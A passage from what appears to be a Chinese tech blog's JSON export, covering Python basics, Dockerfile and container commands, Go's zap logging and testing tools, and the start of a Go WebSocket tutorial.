在包被导入时会被执行。该文件就是一个正常的python代码文件，因此可以将初始化代码放入该文件中。\n\n<!-- more -->\n\n### 2. python命名规范\n\n##### 2.1 模块\n\n- 模块尽量使用小写命名，首字母保持小写，尽量不要用下划线(除非多个单词，且数量不多的情况)\n\n```python\n# 正确的模块名\nimport decoder\nimport html_parser\n\n# 不推荐的模块名\nimport Decoder\n```\n\n##### 2.2 类名\n\n- 类名使用驼峰(CamelCase)命名风格，首字母大写，私有类可用一个下划线开头\n\n```Python\nclass Farm():\n    pass\n\nclass AnimalFarm(Farm):\n    pass\n\nclass _PrivateFarm(Farm):\n    pass\n```\n\n- 将相关的类和顶级函数放在同一个模块里. 不像Java, 没必要限制一个类一个模块.\n\n##### 2.3 函数\n\n- 函数名一律小写，如有多个单词，用下划线隔开\n\n```python\ndef run():\n    pass\n\ndef run_with_env():\n    pass\n```\n\n- 私有函数在函数前加一个下划线_\n\n```python\nclass Person():\n    def _private_func():\n        pass\n```\n\n##### 2.4 变量名\n\n- 变量名尽量小写, 如有多个单词，用下划线隔开\n\n```python\nif __name__ == '__main__':\n    count = 0\n    school_name = ''\n```\n\n##### 2.5 常量\n\n- 常量使用以下划线分隔的大写命名\n\n```python\nMAX_CLIENT = 100\nMAX_CONNECTION = 1000\nCONNECTION_TIMEOUT = 600\n```\n\n\n\n### 3. python 方法返回多个值\n\n```python\ndef f():\n    return True, False\n  \n  \nx, y = f()\nprint(x)\nprint(y)\n\ngives:\nTrue\nFalse\n```\n\n\n\n### 4. sprintf()格式化输出\n\n```python\n# 字符串\n'%s %s' % ('one', 'two')\n'{} {}'.format('one', 'two')\none two\n\n\n# int\n'%d %d' % (1, 2)\n'{} {}'.format(1, 2)\n1 2\n\n\n# float\n'%f' % (3.141592653589793,)\n'{:f}'.format(3.141592653589793)\n3.141593\n\n\n# 顺序\n'{1} {0}'.format('one', 'two')\ntwo one\n```\n\n\n\n### 5.  for循环\n\n```python\n# for in 循环\nfruits = [\"apple\", \"banana\", \"cherry\"]\nfor x in fruits:\n  print(x)\n  \n  \n# range循环\nfor x in range(2, 6):\n  print(x)#2 3 4 5\nfor x in range(2, 10, 3):\n  print(x)# 2 5 8\n  \n  \n\n# 循环带 k, v\npresidents = [\"Washington\", \"Adams\", \"Jefferson\", \"Madison\", \"Monroe\", \"Adams\", \"Jackson\"]\nfor num, name in enumerate(presidents, start=1):\n    print(\"President {}: {}\".format(num, name))\n    \n  \n# 循环多个\ncolors = [\"red\", \"green\", \"blue\", \"purple\"]\nratios = [0.2, 0.3, 0.1, 0.4]\nfor color, ratio in zip(colors, ratios):\n    print(\"{}% {}\".format(ratio * 100, color))\n    \n    \n# 死循环\nwhile True:\n  pass\n```\n\n\n\n### 6. `if __name__ == 'main'`\n\n一个python的文件有两种使用的方法，第一是直接作为脚本执行，第二是import到其他的python脚本中被调用（模块重用）执行。\n\n\n\n`if __name__ == 'main'`: 的作用就是控制这两种情况执行代码的过程，在`if __name__ == 'main'`: 下的代码只有在第一种情况下（即文件作为脚本直接执行）才会被执行，而import到其他脚本中是不会被执行的。\n\n\n\n\n\n### 7. `__pycache__`\n\n在python中运行程序时，解释器首先将其编译为字节码，并将其存储在`__pycache__`文件夹。如果您在那里查找，您将发现一堆文件共享的名称。在项目文件夹中的Py文件，只有它们的扩展名才是其中之一.PYC或.pyo.。这些分别是字节码编译和优化字节码编译版本的程序的文件。\n\n\n下次再执行工程时，若解释器发现这个 *.py 脚本没有修改过，就会跳过编译这一步，直接运行以前生成的保存在 __pycache__文件夹里的 *.pyc 文件。\n\n这样工程较大时就可以大大缩短项目运行前的准备时间；如果你只需执行一个小工程，没关系 忽略这个文件夹就行。\n\n\n\n### 8. 打开文件设置编码读取\n\n```python\nwith open(\"1.html\", \"r\", encoding='gbk') as f:\n  contents = f.read()\n  parse_html(contents)\n```\n\n\n\n### 9. 读写 json 文件\n\n```python\nclass File(object):\n    def __init__(self):\n        self.name = \"zk8.json\"\n        if not os.path.exists(self.name): # 没有就写一下\n            with open(self.name, 'w'): pass\n\n\n    def save(self, data):\n        with open(self.name, 'w', encoding='utf-8') as f:\n            json.dump(data, f, ensure_ascii=False, indent=4)\n\n\n    def load(self):\n        with open(self.name, 'r', encoding='utf-8') as f:\n            data = json.load(f)\n            return data\n\n```\n\n\n\n### 10. 数据结构 操作\n\n```python\n############ list ############\n>>> fruits = ['orange', 'apple', 'pear', 'banana', 'kiwi', 'apple', 'banana']\n>>> fruits.count('apple')\n2\n>>> fruits.count('tangerine')\n0\n>>> fruits.index('banana')\n3\n>>> fruits.index('banana', 4)  # Find next banana starting a position 4\n6\n>>> fruits.reverse()\n>>> fruits\n['banana', 'apple', 'kiwi', 'banana', 'pear', 'apple', 'orange']\n>>> fruits.append('grape')\n>>> fruits\n['banana', 'apple', 'kiwi', 'banana', 'pear', 'apple', 'orange', 'grape']\n>>> fruits.sort()\n>>> fruits\n['apple', 'apple', 'banana', 'banana', 'grape', 'kiwi', 'orange', 'pear']\n>>> fruits.pop()\n'pear'\n\n\n############ tuple ############\n\n>>> t = 12345, 54321, 'hello!'\n>>> t[0]\n12345\n>>> t\n(12345, 54321, 'hello!')\n>>> # Tuples may be nested:\n... u = t, (1, 2, 3, 4, 5)\n>>> u\n((12345, 54321, 'hello!'), (1, 2, 3, 4, 5))\n>>> # Tuples are immutable:\n... t[0] = 88888\nTraceback (most recent call last):\n  File \"<stdin>\", line 1, in <module>\nTypeError: 'tuple' object does not support item assignment\n>>> # but they can contain mutable objects:\n... v = ([1, 2, 3], [3, 2, 1])\n>>> v\n([1, 2, 3], [3, 2, 1])\n\n############ set ############\n\n>>> basket = {'apple', 'orange', 'apple', 'pear', 'orange', 'banana'}\n>>> print(basket)                      # show that duplicates have been removed\n{'orange', 'banana', 'pear', 'apple'}\n>>> 'orange' in basket                 # fast membership testing\nTrue\n>>> 'crabgrass' in basket\nFalse\n\n>>> # Demonstrate set operations on unique letters from two words\n...\n>>> a = set('abracadabra')\n>>> b = set('alacazam')\n>>> a                                  # unique letters in a\n{'a', 'r', 'b', 'c', 'd'}\n>>> a - b                              # letters in a but not in b\n{'r', 'd', 'b'}\n>>> a | b                              # letters in a or b or both\n{'a', 'c', 'r', 'd', 'b', 'm', 'z', 'l'}\n>>> a & b                              # letters in both a and b\n{'a', 'c'}\n>>> a ^ b                              # letters in a or b but not both\n{'r', 'd', 'b', 'm', 'z', 'l'}\n\n\n\n\n############ dict ############\n>>> tel = {'jack': 4098, 'sape': 4139}\n>>> tel['guido'] = 4127\n>>> tel\n{'jack': 4098, 'sape': 4139, 'guido': 4127}\n>>> tel['jack']\n4098\n>>> del tel['sape']\n>>> tel['irv'] = 4127\n>>> tel\n{'jack': 4098, 'guido': 4127, 'irv': 4127}\n>>> list(tel)\n['jack', 'guido', 'irv']\n>>> sorted(tel)\n['guido', 'irv', 'jack']\n>>> 'guido' in tel\nTrue\n>>> 'jack' not in tel\nFalse\n\n# 避免 循环中删除 key 报错\nfor i in list(d):\n  del d[i]\n```\n\n\n\n\n\n### 11. 类的特殊函数\n\n```python\n# __init__ 构造\nclass Foo:\n    def __init__(self, a, b, c):\nx = Foo(1, 2, 3) \n\n## __del__ 析构\nclass FileObject:\n    def __del__(self):\n        self.file.close()\n        del self.file\n\n\n# __call__ 类变成可调用\nclass Foo:\n    def __call__(self, a, b, c):\nx = Foo()\nx(1, 2, 3) \n\n\n#__getattr__ 不存在的属性\nclass Dummy(object):\n    def __getattr__(self, attr):\n        return attr.upper()\nd = Dummy()\nd.does_not_exist # 'DOES_NOT_EXIST'\n```\n\n\n\n### 12. 枚举\n\n```python\nfrom enum import Enum \nclass Animal(Enum):\n    ant = 1\n    bee = 2\n    cat = 3\n    dog = 4\n```\n\n\n\n### 13. 新的线程定时执行函数\n\n```python\ntimer = threading.Timer(10, func)\ntimer.start()\n```\n\n\n\n### 14. PYTHONPATH \n\n主要解决 ModuleNotFoundError: No module named 'pkg'\n\n```bash\necho $PYTHONPATH\nexport PYTHONPATH=\"/Users/liuwei/workspace/python/zk8\"\n```\n\n\n\n### 15. time\n\n```python\n# time format\nfrom datetime import datetime\ndatetime.now().strftime(\"%Y-%m-%d %H:%M:%S\")\n\n# time diff\ndef get_time_diff(date):\n    FMT = '%Y-%m-%d %H:%M'\n    now = datetime.datetime.strptime(time.strftime(FMT), FMT)\n    start = datetime.datetime.strptime(date, FMT)\n    return (now - start).seconds\n  \n  \n# seconds to human  \nstr(datetime.timedelta(seconds=get_time_diff(10000)))\n```\n\n\n\n### 16. try catch\n\n```python\n# except and raise\ntry:\n    f = open('myfile.txt')\n    s = f.readline()\n    i = int(s.strip())\nexcept OSError as err:\n    print(\"OS error: {0}\".format(err))\nexcept ValueError:\n    print(\"Could not convert data to an integer.\")\nexcept:\n    print(\"Unexpected error:\", sys.exc_info()[0])\n    raise\n    \n\n # 拿到 error 信息\ntry:\n  except Exception as e:\n  else:\n    \n try:\n  except Exception as e:\n  finally:\n```\n\n\n\n### 17. string\n\n```python\nstring = 'GeeksforGeeks'\nprint(string.lower()) \nprint(string.upper()) \n\n\n# contain\n>>> str = \"Messi is the best soccer player\"\n>>> \"soccer\" in str\nTrue\n```\n\n\n\n\n\n### 18. 类\n\n```python\n\"\"\"\n（1）_xxx      \"单下划线 \" 开始的成员变量叫做保护变量，意思是只有类实例和子类实例能访问到这些变量，\n需通过类提供的接口进行访问；不能用'from module import *'导入\n（2）__xxx    类中的私有变量/方法名 （Python的函数也是对象，所以成员方法称为成员变量也行得通。）,\n\" 双下划线 \" 开始的是私有成员，意思是只有类对象自己能访问，连子类对象也不能访问到这个数据。\n（3）__xxx__ 系统定义名字，前后均有一个“双下划线” 代表python里特殊方法专用的标识，如 __init__（）代表类的构造函数。\n\"\"\"\n```\n\n\n\n\n\n### 19. 打乱list\n\n```\ncats = list(range(10, 17))\nrandom.shuffle(cats)\n```\n\n\n\n### *arg 和**args\n\nhttp://www.wklken.me/posts/2013/12/21/how-to-use-args-and-kwargs-in-python.html","tags":["python"],"categories":["python"]},{"title":"记录一次docker镜像的构建过程","url":"%2Fp%2F2450240c.html","content":"\n在制作 Docker Images 之前, 我们先看一下Docker 官方提供了一些建议和准则，在大多数情况下建议遵守。\n\n+ 容器是短暂的，也就是说，你需要可以容易的创建、销毁、配置你的容器。\n\n+ 多数情况，构建镜像的时候是将 Dockerfile 和所需文件放在同一文件夹下。但为了构建性能，我们可以采用 [.dockerignore](https://deepzz.com/post/dockerfile-reference.html#toc_6) 文件来排除文件和目录。\n\n+ 避免安装不必要的包，构建镜像应该尽可能减少复杂性、依赖关系、构建时间及镜像大小。\n\n+ 最小化层数。 Dockerfile的一行(除MAINTAINER外)对应镜像的一层，为使层数足够小，故可以将类似的命令串起来，比如RUN 指令，可以使用&&连接多个指令，如此也只有一层。\n\n+ 排序多行参数，通过字母将参数排序来缓解以后的变化，这将帮你避免重复的包、使列表更容易更新，如：\n\n```dockerfile\nRUN apt-get update && apt-get install -y \\\n  bzr \\\n  cvs \\\n  git \\\n  mercurial \\\n  subversion\n```\n\n<!-- more -->\n\n\n\n### 0. 前言\n\n容器内没有后台服务的概念。容器就是为了主进程而存在的，主进程退出，容器就失去了存在的意义，从而退出，其它辅助进程不是它需要关心的东西。所以CMD 运行可执行程序, 阻塞才可以, 要不然会退出。\n\n\n\n###  1. FROM 仓库\n\n尽可能的使用官方仓库存储的镜像作为基础镜像。官方建议使用 [Debian](https://hub.docker.com/_/debian/)，大小在 150mb 左右。不过在实际开发中，应该用到 [alpine](https://hub.docker.com/_/alpine/) 的次数比较多，因为它仅 5mb 左右。 busybox更只有1M多。\n\n参考: https://blog.csdn.net/bbwangj/article/details/81088231\n\n\n\n### 2. 指令\n\n##### 2.1 COPY 和 ADD 的区别\n\n在大多数情况下使用COPY, 使用ADD的唯一原因就是你有一个压缩文件，你想自动解压到镜像中。\n\n##### 2.2 RUN 和 CMD 的区别\n\n+ RUN命令是创建Docker镜像的步骤，一个Dockerfile中可以有许多个RUN命令。\n+ CMD命令是当Docker镜像被启动后Docker容器将会默认执行的命令。一个Dockerfile中只能有一个CMD命令。通过执行docker run $image other_command启动镜像可以重载CMD命令。\n\n##### 2.3 ENTRYPOINT 和 CMD的区别\n\nThe main purpose of a CMD is to provide defaults for an executing container. These defaults can include an executable, or they can omit the executable, in which case you must specify an ENTRYPOINT instruction as well.\n\n如果docker run没有指定任何的执行命令或者dockerfile里面也没有entrypoint，那么，就会使用cmd指定的默认的执行命令执行。同时也从侧面说明了entrypoint的含义，它才是真正的容器启动以后要执行命令。\n\n+ CMD的用法\n\n  ```\n  The CMD instruction has three forms:\n   \n  CMD [\"executable\",\"param1\",\"param2\"] (exec form, this is the preferred form) //推荐\n  CMD [\"param1\",\"param2\"] (as default parameters to ENTRYPOINT)\n  CMD command param1 param2 (shell form)\n  \n  \n  \n  \n  \n  \n  eg1: CMD [\"/bin/bash\", \"-c\", \"echo 'hello cmd!'\"]\n  eg2: CMD [\"hello cmd!\"]\n\t\t ENTRYPOINT [\"echo\"]\n  eg3: CMD echo \"hello cmd!\"\n  ```\n  \n  \n  \n+ entrypoint的用法\n\n  An ENTRYPOINT allows you to configure a container that will run as an executable.\n\n  ```\n  ENTRYPOINT has two forms:\n  \n  ENTRYPOINT [\"executable\", \"param1\", \"param2\"] (exec form, preferred) //推荐\n  ENTRYPOINT command param1 param2 (shell form)\n  \n  \n  \n  \n  \n  eg1: 如果命令后面有东西，那么后面的全部都会作为entrypoint的参数。如果没有，但是cmd有，那么cmd的全部内容会作为entrypoint的参数, 会输出 hello cmd 的\n  \n  CMD [\"hello cmd!\"]\n  ENTRYPOINT [\"echo\"]\n  \n  \n  \n  \n  eg2: 这个时候是不会输出 hello cmd 的\n  \n  CMD [\"hello cmd!\"]\n  ENTRYPOINT echo\n  ```\n\n+ 覆盖问题\n\n  + cmd 除非默认, 否则轻易被覆盖\n\n  + entrypoint 可以用 --entrypoint 覆盖\n\n  + 所以建议entrypoint固定, cmd 被覆盖, 结合使用, 并且永远使用Exec表示法\n\n\n\n##### 2.9 环境变量写法\n\n```\nENV KS_HAVEN_ADDR=':16097' \\\nKS_HAVEN_QUIC_ADDR=':16097'\n```\n\n\n\n### 3. 构建镜像\n\n在 Dockerfile 文件所在目录执行：    `docker build -t image_name .`\n\n\n\n##### 3.1 构建的上下文\n\n1. c/s架构, 在服务端构建\n2. 服务端要获取文件, 需要把上下文目录打包发过去 (COPY ../package.json /app 或者 COPY /opt/xxxx /app 无法成功, 超出了上下文)\n3. 最好将dockerfile放在空目录下或项目根目录下, 如果没有所需文件,拷贝过来, 避免发送太多文件给引擎\n\n\n\n##### 3.2 镜像 save load\n\n```bash\ndocker images #查看构建的image\n\ndocker save image/test > image_test.tar.gz # save image\n\ndocker load -i image_test.tar.gz # load image\n```\n\n\n\n### 4. 容器操作\n\n\n\n##### 4.1 运行和进入容器\n\n```bash\ndocker run -d -p 16097:16097 -p 15098:15098  image_name # 启动容器\n\ndocker extc -it 容器名字 bash # 进入容器内部\ndocker exec -it 容器ID  sh   # 进入容器内部\n```\n\n\n\n##### 4.2 看容器log\n\n```bash\ndocker logs -f CONTAINER_ID\n\ndocker logs -f --tail=100 CONTAINER_ID\n```\n\n\n\n##### 4.3 容器和宿主拷贝内容\n\n```bash\ndocker cp foo.txt mycontainer:/foo.txt \ndocker cp mycontainer:/foo.txt foo.txt\n```\n\n\n\n##### 4.4 容器访问宿主主机端口\n\n+ https://jingsam.github.io/2018/10/16/host-in-docker.html\n\n\n\n### 5. 参考资料\n\n+ https://blog.csdn.net/wdq347/article/details/78753322 docker之镜像制作\n+ https://deepzz.com/post/dockerfile-best-practices.html  如何写好Dockerfile，Dockerfile最佳实践","tags":["docker"],"categories":["docker"]},{"title":"golang的log库zap的使用","url":"%2Fp%2F5d303099.html","content":"\n### 0. 前言\n\n日志作为整个代码行为的记录，是程序执行逻辑和异常最直接的反馈。对于整个系统来说，日志是至关重要的组成部分。通过分析日志我们不仅可以发现系统的问题，同时日志中也蕴含了大量有价值可以被挖掘的信息，因此合理地记录日志是十分必要的。\n\n<!-- more -->\n\n### 1. golang log libs\n\n目前golang主流的 log库有\n\n+ https://github.com/uber-go/zap\n+ https://github.com/Sirupsen/logrus\n\nzap 跟 logrus 以及目前主流的 go 语言 log 类似，提倡采用结构化的日志格式，而不是将所有消息放到消息体中，简单来讲，日志有两个概念：字段和消息。字段用来结构化输出错误相关的上下文环境，而消息简明扼要的阐述错误本身。\n\n##### 1.1 log库使用和性能对比\n\n```go\npackage main\n\nimport (\n\t\"encoding/json\"\n\t\"fmt\"\n\t\"log\"\n\t\"math/rand\"\n\t\"time\"\n\n\t\"github.com/golang/glog\"\n\t\"github.com/sirupsen/logrus\"\n\t\"go.uber.org/zap\"\n)\n\ntype dummy struct {\n\tFoo string `json:\"foo\"`\n\tBar string `json:\"bar\"`\n}\n\nconst letterBytes = \"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ\"\nconst (\n\tletterIdxBits = 6                    // 6 bits to represent a letter index\n\tletterIdxMask = 1<<letterIdxBits - 1 // All 1-bits, as many as letterIdxBits\n\tletterIdxMax  = 63 / letterIdxBits   // # of letter indices fitting in 63 bits\n)\n\nfunc RandString(n int) string {\n\tb := make([]byte, n)\n\t// A rand.Int63() generates 63 random bits, enough for letterIdxMax letters!\n\tfor i, cache, remain := n-1, rand.Int63(), letterIdxMax; i >= 0; {\n\t\tif remain == 0 {\n\t\t\tcache, remain = rand.Int63(), letterIdxMax\n\t\t}\n\t\tif idx := int(cache & letterIdxMask); idx < len(letterBytes) {\n\t\t\tb[i] = letterBytes[idx]\n\t\t\ti--\n\t\t}\n\t\tcache >>= letterIdxBits\n\t\tremain--\n\t}\n\treturn string(b)\n}\n\nfunc dummyData() interface{} {\n\treturn dummy{\n\t\tFoo: RandString(12),\n\t\tBar: RandString(16),\n\t}\n}\n\nfunc main() {\n\n\t// logrus\n\tvar x int64 = 0\n\tt := time.Now()\n\tfor i := 0; i < 10000; i++ {\n\t\tlogrus.WithField(\"Dummy\", dummyData()).Infoln(\"this is a dummy log\")\n\t}\n\tx += time.Since(t).Nanoseconds()\n\n\t// zap\n\tzlogger, _ := zap.NewProduction()\n\tsugar := zlogger.Sugar()\n\tvar y int64 = 0\n\tt = time.Now()\n\tfor i := 0; i < 10000; i++ {\n\t\tsugar.Infow(\"this is a dummy log\", \"Dummy\", dummyData())\n\t}\n\ty += time.Since(t).Nanoseconds()\n\n\t// stdlog\n\tvar z int64 = 0\n\tt = time.Now()\n\tfor i := 0; i < 10000; i++ {\n\t\tdummyStr, _ := json.Marshal(dummyData())\n\t\tlog.Printf(\"this is a dummy log: %s\\n\", string(dummyStr))\n\t}\n\tz += time.Since(t).Nanoseconds()\n\n\t// glog\n\tvar w int64 = 0\n\tt = time.Now()\n\tfor i := 0; i < 10000; i++ {\n\t\tglog.Info(\"\\nthis is a dummy log: \", dummyData())\n\t}\n\tw += time.Since(t).Nanoseconds()\n\n\t// print\n\tfmt.Println(\"=====================\")\n\tfmt.Printf(\"Logrus: %5d ns per request \\n\", x/10000)\n\tfmt.Printf(\"Zap:    %5d ns per request \\n\", y/10000)\n\tfmt.Printf(\"StdLog: %5d ns per request \\n\", z/10000)\n\tfmt.Printf(\"Glog:   %5d ns per request \\n\", w/10000)\n}\n\n\n/*\n=====================\nLogrus: 19305 ns per request\nZap:     1095 ns per request\nStdLog:  7137 ns per request\nGlog:   12070 ns per request\n*/\n```\n\n\n\n### 2. zap 使用\n\n+ sugar模式 (牺牲性能为代价,增强可用性)\n\n```go\nfunc main() {\n\tlogger, _ := zap.NewProduction()\n\tdefer logger.Sync()\n\n\turl := \"https://www.liuvv.com\"\n\tsugar := logger.Sugar()\n\tsugar.Infow(\"failed to fetch URL\",\n\t\t\"url\", url,\n\t\t\"attempt\", 3,\n\t\t\"backoff\", time.Second,\n\t)\n\n\tsugar.Infof(\"Failed to fetch URL: %s\", url)\n}\n\n\n// 注意 infow 和 infof 的调用区别\n\n/*\n{\"level\":\"info\",\"ts\":1566623998.1506088,\"caller\":\"log/main.go:15\",\"msg\":\"failed to fetch URL\",\"url\":\"https://www.liuvv.com\",\"attempt\":3,\"backoff\":1}\n \n{\"level\":\"info\",\"ts\":1566623998.15073,\"caller\":\"log/main.go:20\",\"msg\":\"Failed to fetch URL: https://www.liuvv.com\"}\n*/\n```\n\n+ logger 模式\n\n```go\nfunc main() {\n\tlogger, _ := zap.NewProduction()\n\tdefer logger.Sync()\n\n\turl := \"https://www.liuvv.com\"\n\tlogger.Info(\"failed to fetch URL\",\n\t\tzap.String(\"url\", url),\n\t\tzap.Int(\"attempt\", 3),\n\t\tzap.Duration(\"backoff\", time.Second),\n\t)\n\n\t//logger.Infow() //没有此函数\n\t//logger.Infof() //没有此函数\n}\n\n\n/*\n{\"level\":\"info\",\"ts\":1566624270.4984472,\"caller\":\"log/main.go:14\",\"msg\":\"failed to fetch URL\",\"url\":\"https://www.liuvv.com\",\"attempt\":3,\"backoff\":1}\n*/\n```\n\n\n\n##### 2.1 zap序列化输出\n\n```\nzap.NewDevelopment() //格式化输出\nzap.NewProduction() //json序列化输出\n```\n\n\n\n##### 2.2 输出到文件里\n\n```go\nfunc NewLogger() (*zap.Logger, error) {\n  cfg := zap.NewProductionConfig()\n  cfg.OutputPaths = []string{\n    \"/var/log/myproject/myproject.log\",\n  }\n  return cfg.Build()\n}\n```\n\n\n\n##### 2.3 输入到滚动文件里\n\nLumberjack用于将日志写入滚动文件。zap 不支持文件归档，如果要支持文件按大小或者时间归档，需要使用lumberjack，lumberjack也是zap官方推荐的。https://github.com/natefinch/lumberjack\n\n```go\nfunc main() {\n\t// lumberjack.Logger is already safe for concurrent use, so we don't need to\n\t// lock it.\n\thook := &lumberjack.Logger{\n\t\tFilename:   \"/tmp/foo.log\", // 日志文件路径\n\t\tMaxSize:    500,            // 每个日志文件保存的最大尺寸 单位：M\n\t\tMaxBackups: 3,              // 日志文件最多保存多少个备份\n\t\tMaxAge:     28,             // 文件最多保存多少天\n\t\tCompress:   true,           // 是否压缩\n\t}\n\tcore := zapcore.NewCore(\n\t\tzapcore.NewJSONEncoder(zap.NewProductionEncoderConfig()),                       // 编码器配置\n\t\tzapcore.NewMultiWriteSyncer(zapcore.AddSync(os.Stdout), zapcore.AddSync(hook)), // 打印到控制台和文件\n\t\tzap.InfoLevel, // 日志级别\n\t)\n\n\tlogger := zap.New(core)\n\tlogger.Info(\"failed to fetch URL\",\n\t\tzap.String(\"url\", \"https://www.liuvv.com\"),\n\t\tzap.Int(\"attempt\", 3),\n\t\tzap.Duration(\"backoff\", time.Second),\n\t)\n}\n```\n\n\n\n### 3. 参考资料\n\n+ https://zhuanlan.zhihu.com/p/41991119","tags":["golang"],"categories":["4_golang实战"]},{"title":"golang编写测试用例","url":"%2Fp%2F269bf134.html","content":"\n\n\n### 1. Learn Go with tests\n\n当学习一门语言时, 最有效的办法不是每一章的去阅读概念, 而是通过例子探索学习.\n\n如果没有学习过 Go 语言的, 强烈建议通过编写测试学习 Go 语言, 不仅为测试驱动开发打下基础, 还是可以使用 Go 语言编写健壮的、经过良好测试的系统.\n\n强烈推荐: https://github.com/quii/learn-go-with-tests\n\n<!-- more -->\n\n\n\n### 2. Golang Test\n\nGo语言中自带有一个轻量级的测试框架`testing`和自带的`go test`命令来实现单元测试和性能测试，`testing`框架和其他语言中的测试框架类似，你可以基于这个框架写针对相应函数的测试用例，也可以基于该框架写相应的压力测试用例。测试用例有四种形式： \n\n+ TestXxxx(t *testing.T) // 单元测试\n+ TestBenchmarkXxxx(b* testing.B) // 压力测试\n+ Example_Xxx() // 测试控制台输出的例子 \n+ TestMain(m *testing.M) // 测试Main函数\n\n当然我们也可以使用第三方的测试框架, 更加高效的测试我们的代码:\n\nhttps://github.com/stretchr/testify\n\n\n\n###  3. 单元测试\n\n\n+ 需要创建一个名称以 _test.go 结尾的文件，该文件包含 `TestXxx` 函数\n+ `func TestXxx(*testing.T)`   // Xxx 可以是任何字母数字字符串，但是第一个字母不能是小些字母。\n+ 单元测试中，传递给测试函数的参数是 `*testing.T` 类型。\n\n\n\n##### 3.1 单元测试方法\n\n+ 当我们遇到一个断言错误的时候，标识这个测试失败，会使用到：\n\n  ```\n  Fail: 测试失败，测试继续，也就是之后的代码依然会执行\n  FailNow: 测试失败，测试中断\n  ```\n\n+ 当我们只希望打印信息，会用到:\n\n  ```\n  Log: 输出信息\n  Logf: 输出格式化的信息\n  ```\n\n+ 当我们断言失败的时候，不希望标识测试失败，会用到：\n\n  ```\n  Skip: 相当于 Log + SkipNow\n  Skipf: 相当于 Logf + SkipNow\n  SkipNow: 跳过测试，测试中断\n  ```\n\n+ 当我们断言失败的时候，希望标识测试失败，但是测试继续，会用到：\n\n  ```\n  Error: 相当于 Log + Fail\n  Errorf: 相当于 Logf + Fail\n  ```\n\n+ 当我们断言失败的时候，希望标识测试失败，但中断测试，会用到\n\n  ```\n  Fatal: 相当于 Log + FailNow\n  Fatalf: 相当于 Logf + FailNow\n  ```\n\n  \n\n### 4.  压力测试\n\n+ func BenchmarkXxx(*testing.B)  //函数形式\n+ 通过 \"go test\" 命令，加上 `-bench` flag 来执行\n\n```go\nfunc BenchmarkIsPalindrome(b *testing.B) {\n\tfor i := 0; i < b.N; i++ {\n\t\tIsPalindrome(\"A man, a plan, a canal: Panama\")\n\t}\n}\n\n$ go test -bench=.\nPASS\nBenchmarkIsPalindrome-8 1000000                1035 ns/op\nok      gopl.io/ch11/word2      2.179s\n```\n\n结果中基准测试名的数字后缀部分，这里是8，表示运行时对应的GOMAXPROCS的值。\n\n报告显示每次调用IsPalindrome函数花费1.035微秒，是执行1,000,000次的平均时间。\n\n因为基准测试驱动器开始时并不知道每个基准测试函数运行所花的时间，它会尝试在真正运行基准测试前先尝试用较小的N运行测试来估算基准测试函数所需要的时间，然后推断一个较大的时间保证稳定的测量结果。\n\n\n\n### 5. 常用测试用法\n\n##### 5.1 测试单个文件和单个方法\n\n+ 测试单个文件 go test -v  file_test.go\n\n+ 测试单个函数：go test -v file_test.go -test.run TestFunc\n\n##### 5.2 测试goroutine 是否竞争\n\n```\ngo test -race\n```\n\n##### 5. 3 TestMain函数\n\n在测试之前或之后进行额外的设置（setup）或拆卸（teardown), 测试进入的第一个函数\n\n```\nfunc TestMain(m *testing.M)\n```\n\n##### 5.4 测试覆盖率\n\n```\ngo tool cover -html=c.out\n```\n\n\n\n### 6. 参考资料\n\n+ https://github.com/quii/learn-go-with-tests  //非常重要\n+ https://github.com/stretchr/testify\n\n+ https://books.studygolang.com/The-Golang-Standard-Library-by-Example/chapter09/09.0.html\n\n+ https://studygolang.com/articles/12587\n\n","tags":["golang"],"categories":["4_golang实战"]},{"title":"golang的websocket实战","url":"%2Fp%2Ffae4c74c.html","content":"\n### 1. 前言\n\n有些场景下，比如交易 K 线，我们需要前端对后端进行轮询来不断获取或者更新资源状态。轮询的问题毫无以为是一种笨重的方式，因为每一次 http 请求除了本身的资源信息传输外还有三次握手以及四次挥手。替代轮询的一种方案是复用一个 http 连接，更准确的复用同一个 tcp 连接。这种方式可以是 http 长连接，也可以是 websocket。\n\n<!-- more -->\n\n##### 1.1. http长连接\n\nhttp 其实不存在长短连接, http协议的长连接和短连接，实质上是tcp协议的长连接和短连接。\n\nhttp会话永远都是：请求响应结束，这里长连接指一次tcp连接可以传递多次的HTTP报文信息。\n\n##### 1.2 websocket\n\nwebsocket协议是基于tcp的一种新的网络协议。它实现了浏览器与服务器全双工(full-duplex)通信——允许服务器主动发送信息给客户端。\nwebsocket通信协议于2011年被IETF定为标准RFC 6455，并被RFC7936所补充规范。\n\n##### 1.3 websocket 和 http 长连接的区别\n\n首先 websocket 和 http 是完全不同的两种协议，虽然底层都是 tcp/ip。http 长连接也是属于 http 协议。\n\nhttp 协议和 websocket 的最大区别就是 http 是基于 request/response 模式，而 websocket 的 client 和 server 端却可以随意发起 data push。\n\n##### 1.4 sse(server-sent events)\n\nsse是 websockct 的一种轻量代替方案，使用 http 协议。sse 规范是 html5 规范的一个组成部分。\n\n严格地说，http无法做到服务器主动推送信息。但是，有一种变通方法，就是服务器向客户端声明，接下来要发送的是流信息（Content-Type: text/event-stream）。\n\n总体来说，websocket 更强大和灵活。因为它是全双工通道，可以双向通信；sse 是单向通道，只能服务器向浏览器发送，因为流信息本质上就是下载。如果浏览器向服务器发送信息，就变成了另一次 http 请求。\n\n\n\n### 2. golang websocket\n\n在golang语言中，目前有两种比较常用的实现方式：一个是golang自带的库，另一个是[gorilla](github.com/gorilla/websocket)，后者功能更加强大。\n\n\n\n##### 2.1 server端\n\n下面server端是一个http 服务器，监听8080端口。当接收到连接请求后，将连接使用的http协议升级为websocket协议。后续通信过程中，使用websocket进行通信。\n\n对每个连接，server端等待读取数据，读到数据后，打印数据，然后，将数据又发送给client\n\n```go\npackage main\n\nimport (\n\t\"flag\"\n\t\"log\"\n\t\"net/http\"\n\n\t\"github.com/gorilla/websocket\"\n)\n\nvar addr = flag.String(\"addr\", \"localhost:8080\", \"http service address\")\n\nvar upgrader = websocket.Upgrader{} // use default options\n\nfunc echo(w http.ResponseWriter, r *http.Request) {\n\tc, err := upgrader.Upgrade(w, r, nil)\n\tif err != nil {\n\t\tlog.Print(\"upgrade:\", err)\n\t\treturn\n\t}\n\tdefer c.Close()\n\tfor {\n\t\tmt, message, err := c.ReadMessage()\n\t\tif err != nil {\n\t\t\tlog.Println(\"read:\", err)\n\t\t\tbreak\n\t\t}\n\t\tlog.Printf(\"server recv: %s\", message)\n\t\terr = c.WriteMessage(mt, message)\n\t\tif err != nil {\n\t\t\tlog.Println(\"write:\", 